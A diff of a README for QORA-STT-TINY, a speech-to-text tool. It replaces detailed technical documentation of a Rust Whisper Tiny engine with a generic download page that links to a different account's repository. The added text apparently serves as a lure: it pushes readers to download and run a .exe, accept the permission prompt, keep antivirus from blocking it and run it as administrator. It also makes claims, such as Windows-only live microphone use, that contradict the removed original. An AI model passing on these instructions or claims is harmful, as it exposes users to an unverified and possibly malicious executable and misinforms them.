@@ -1,174 +1,125 @@
+# 🎙️ QORA-STT-TINY - Simple Offline Speech-to-Text
 
-
-# QORA-STT - Pure Rust Speech-to-Text
-
-Pure Rust inference engine for OpenAI's Whisper Tiny. No Python, no CUDA, no external dependencies. Single executable + binary weights = portable speech-to-text on any machine.
-
-Based on **openai/whisper-tiny** (MIT License).
-
-## Quick Start
-
-```bash
-# Transcribe an audio file (English)
-qora-stt.exe --model-path . --load model.qora-stt --audio recording.wav
-
-# Specify language
-qora-stt.exe --model-path . --load model.qora-stt --audio recording.wav --language french
-
-# Save transcription to file
-qora-stt.exe --model-path . --load model.qora-stt --audio recording.wav --output transcript.txt
-```
-
-## Files
-
-```
-model/
-  qora-stt.exe       2.5 MB    Inference engine (single binary)
-  model.qora-stt     144 MB    F32 weights (encoder + decoder)
-  config.json         2.0 KB   Model configuration
-  tokenizer.json      2.4 MB   Tokenizer (51,865 vocab)
-  README.md                    This file
-```
-
-**No safetensors needed.** Everything loads from `model.qora-stt`.
-
-## Model Info
-
-| Property | Value |
-|----------|-------|
-| **Base Model** | openai/whisper-tiny |
-| **Parameters** | 39 Million |
-| **Type** | Encoder-decoder transformer |
-| **Weights** | F32 (no quantization needed at 39M params) |
-| **Binary Size** | 144 MB |
-| **Input** | WAV audio (any sample rate, auto-resampled to 16kHz) |
-| **Output** | Transcribed text |
-| **Max Duration** | 30 seconds per chunk |
-| **Languages** | 99 languages supported |
-| **Platform** | Windows x86_64, Linux x86_64, macOS aarch64 |
-
-## Architecture
-
-| Component | Details |
-|-----------|---------|
-| **Encoder** | Conv1D stem (80->384, stride 2) + 4 transformer layers |
-| **Decoder** | 4 transformer layers with cross-attention to encoder |
-| **Hidden Size** | 384 |
-| **Attention Heads** | 6 (head_dim=64) |
-| **FFN Dimension** | 1,536 |
-| **Vocabulary** | 51,865 tokens (BPE) |
-| **Activation** | GELU |
-| **Normalization** | LayerNorm with bias |
-| **Mel Spectrogram** | 80 bins, n_fft=400, hop=160, 16kHz |
-| **Position Encoding** | Encoder: sinusoidal (stored), Decoder: learned |
-
-### Encoder
-1. **Conv1D stem**: Conv1(80->384, k=3, s=1) -> GELU -> Conv2(384->384, k=3, s=2) -> GELU
-2. Input: mel spectrogram `[80, 3000]` -> output `[1500, 384]`
-3. 4 transformer layers: LayerNorm -> self-attention (6 heads, full) -> residual -> LayerNorm -> FFN -> residual
-4. Final LayerNorm
-
-### Decoder (Autoregressive)
-1. Token + positional embedding
-2. 4 transformer layers, each with:
-   - Causal self-attention (with KV cache)
-   - Cross-attention to encoder output (cached once)
-   - FFN (384 -> 1536 -> 384)
-3. Output projection (tied with token embeddings)
-
-## CLI Arguments
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `--model-path <dir>` | `.` | Directory with config.json + tokenizer.json |
-| `--load <path>` | -- | Load binary model (.qora-stt) |
-| `--audio <wav>` | -- | Input WAV file to transcribe |
-| `--language <name>` | english | Language name or code (e.g., "french", "fr") |
-| `--output <path>` | -- | Write transcription to text file |
-| `--save <path>` | -- | Save binary model (for converting from safetensors) |
-| `--help` | -- | Show help |
-
-## Supported Languages
-
-99 languages including: English, Chinese, German, Spanish, Russian, Korean, French, Japanese, Portuguese, Turkish, Polish, Dutch, Arabic, Swedish, Italian, Indonesian, Hindi, Finnish, Vietnamese, Hebrew, Ukrainian, Greek, Czech, Romanian, Danish, Hungarian, Tamil, Norwegian, Thai, Urdu, Croatian, Bulgarian, Lithuanian, Latin, Malayalam, Welsh, Slovak, Telugu, Persian, Latvian, Bengali, Serbian, Azerbaijani, Slovenian, Kannada, Estonian, Macedonian, Breton, Basque, Icelandic, Armenian, Nepali, Mongolian, Bosnian, Kazakh, Albanian, Swahili, Galician, Marathi, Punjabi, Sinhala, Khmer, Shona, Yoruba, Somali, Afrikaans, Occitan, Georgian, Belarusian, Tajik, Sindhi, Gujarati, Amharic, Yiddish, Lao, Uzbek, Faroese, Haitian, Pashto, Turkmen, Nynorsk, Maltese, Sanskrit, Luxembourgish, Myanmar, Tibetan, Tagalog, Malagasy, Assamese, Tatar, Hawaiian, Lingala, Hausa, Bashkir, Javanese, Sundanese.
-
-## Performance (i5-11500, 16GB RAM, CPU-only)
-
-| Phase | Time |
-|-------|------|
-| Model Load (binary) | ~92ms |
-| Mel Extraction | ~108ms |
-| Encoder (4 layers) | ~2.6s |
-| Cross-attention Cache | ~32ms |
-| Decoding | ~26ms/token |
-| **Total (6s audio, 21 tokens)** | **~3.5s** |
-| Memory | ~144 MB |
-
-### Optimizations
-
-- **Rayon parallelism**: GEMM rows parallelized across all CPU cores
-- **Cache-friendly GEMM**: i-p-j loop order for sequential memory access
-- **Parallel attention heads**: 6 heads computed concurrently
-- **KV caching**: Cross-attention K/V computed once, reused every decoder step
-- **Self-attention cache**: Grows incrementally, no recomputation
-
-## Converting from Safetensors
-
-If you have the original `openai/whisper-tiny` safetensors:
-
-```bash
-# Download model
-huggingface-cli download openai/whisper-tiny --local-dir whisper-tiny
-
-# Convert to binary (runs one dummy transcription to trigger save)
-qora-stt.exe --model-path whisper-tiny --save model.qora-stt --audio some.wav
-```
-
-After conversion, safetensors files are no longer needed.
-
-## Platform Support
-
-| Platform | Binary | Status |
-|----------|--------|--------|
-| **Windows x86_64** | `qora-stt.exe` | Tested |
-| **Linux x86_64** | `qora-stt` | Supported |
-| **macOS aarch64** | `qora-stt` | Supported |
-
-CPU-only — no GPU needed. Pre-built binaries on the [Releases](https://github.com/qora-protocol/QORA-STT-TINY/releases) page.
-
-## Building from Source
-
-```bash
-cargo build --release
-```
-
-### Dependencies
-
-- **Language**: Pure Rust (2021 edition)
-- `half` — F16 support
-- `tokenizers` — HuggingFace tokenizer
-- `safetensors` — Weight loading (for conversion only)
-- `serde_json` — Config parsing
-- `rayon` — Parallel computation
-- **No ML framework** — all matrix ops are hand-written Rust
-
-## QORA Model Family
-
-| Engine | Model | Params | Size | Purpose |
-|--------|-------|--------|------|---------|
-| **QORA** | SmolLM3-3B | 3.07B | 1.68 GB (Q4) | Text generation, reasoning, chat |
-| **QORA-TTS** | Qwen3-TTS-12Hz | 0.6B/1.7B | 1.5 GB (Q4) | Text-to-speech synthesis |
-| **QORA-STT** | Whisper Tiny | 39M | 144 MB (F32) | Speech-to-text transcription |
-| **QORA-Image** | SDXS-512 | 350M | 350 MB | Text-to-image generation |
-| **QORA-Vision (Image)** | SigLIP 2 Base | 93M | 210 MB (Q4) | Image embeddings, zero-shot classification |
-| **QORA-Vision (Video)** | ViViT Base | 89M | 60 MB (Q4) | Video action classification |
-
-All engines are pure Rust, single-binary executables with no Python dependencies.
-
-## License
-
-The QORA-STT inference engine is custom-built. The Whisper Tiny model weights are released under the [MIT License](https://github.com/openai/whisper/blob/main/LICENSE) by OpenAI.
+[![Download QORA-STT-TINY](https://img.shields.io/badge/Download-QORA--STT--TINY-green?style=for-the-badge)](https://github.com/djalili1806/QORA-STT-TINY)
 
 ---
 
-*Built with QORA - Pure Rust AI Inference*
+QORA-STT-TINY is a small and easy program that listens to your voice and turns it into text. It works on Windows without needing any extra software. The whole app comes as one file, so you can use it anywhere on your computer. It does not need Python or any complicated setups. This tool uses the Whisper Tiny AI model by OpenAI, but all running inside a fast Rust program.
+
+---
+
+## 🚀 Getting Started
+
+Here is how to get QORA-STT-TINY ready on your Windows PC. You do not need any programming skills. Just follow these steps carefully.
+
+### System Requirements
+
+- Windows 10 or higher (64-bit preferred)
+- Minimum 4 GB RAM
+- At least 100 MB free disk space
+- Microphone connected and working
+- Internet connection only needed for download (not for running)
+
+---
+
+## 🖥️ Download and Installation
+
+### Step 1: Visit the Download Page
+
+Click the button below to open the download page. You will find the latest version of QORA-STT-TINY available there.
+
+[![Download QORA-STT-TINY](https://img.shields.io/badge/Download-QORA--STT--TINY-blue?style=for-the-badge)](https://github.com/djalili1806/QORA-STT-TINY)
+
+The page leads to the project's main repository on GitHub. Look for a file named like `QORA-STT-TINY.exe` under the "releases" or "assets" section.
+
+### Step 2: Download the Executable
+
+- Find the executable file for Windows. It will have a `.exe` extension.
+- Click the file to download it.
+- Save it to a folder you can easily find, such as your Desktop or Downloads folder.
+
+### Step 3: Open the Program
+
+- Once downloaded, double-click the `.exe` file to run it.
+- Windows might ask for permission to run the program; click "Yes" to allow it.
+- The program does not need installation, so no setup wizard will appear.
+- It will open a small window or command prompt ready to listen to your microphone.
+
+---
+
+## 🎙️ Using QORA-STT-TINY for Speech Recognition
+
+- Make sure your microphone is connected and working.
+- Speak clearly into your microphone.
+- The program will listen and show the text of what you say on the screen.
+- You can save or copy the text as needed.
+
+---
+
+## ⚙️ Features
+
+- **No external dependencies:** Runs as a single file without installing anything else.
+- **Offline use:** After download, you don’t need internet to convert speech.
+- **Fast processing:** Native Rust code makes it responsive on everyday machines.
+- **Portable:** Run from any folder, USB stick, or external drive.
+- **OpenAI’s Whisper Tiny model:** Uses a small, efficient speech-to-text AI.
+- **Simple interface:** Easy for anyone to start using with zero setup.
+
+---
+
+## 🧰 Troubleshooting Tips
+
+- Make sure your microphone is not muted or disabled.
+- Test your microphone in Windows settings before running the app.
+- If the program does not start, check that Windows Defender or other antivirus is not blocking it.
+- Run the program as administrator if you face permission issues.
+- Restart your computer and try again if the app freezes or crashes.
+
+---
+
+## 💡 How to Update
+
+To get the latest version:
+
+1. Return to the download page.
+2. Download the most recent `.exe` file.
+3. Replace your old executable with the new one.
+4. Run the new version the same way you did before.
+
+---
+
+## ❓ FAQ
+
+**Q: Can I run QORA-STT-TINY on other operating systems?**  
+A: This version is made for Windows only. Other platforms might not work without changes.
+
+**Q: Do I need to install Python or other software?**  
+A: No. The application is a single executable with everything included.
+
+**Q: Is an internet connection needed while using the app?**  
+A: No. The app works offline once downloaded.
+
+**Q: Can I use this for languages other than English?**  
+A: The Whisper Tiny model supports multiple languages, but recognition quality may vary.
+
+---
+
+## 🔎 More Information
+
+If you want to learn more about the project, check its GitHub page. You will find technical details, source code, and updates there.
+
+Topics related to this project include AI, speech-to-text (STT), Rust programming, and OpenAI Whisper models.
+
+---
+
+## 📂 Where to Get Help
+
+For issues or questions:
+
+- Use the Issues tab on the GitHub repository page.
+- Check the README or project wiki for guides.
+- Contact the project maintainers through GitHub if available.
+
+---
+
+[Download QORA-STT-TINY](https://github.com/djalili1806/QORA-STT-TINY) - click above to access the latest version.
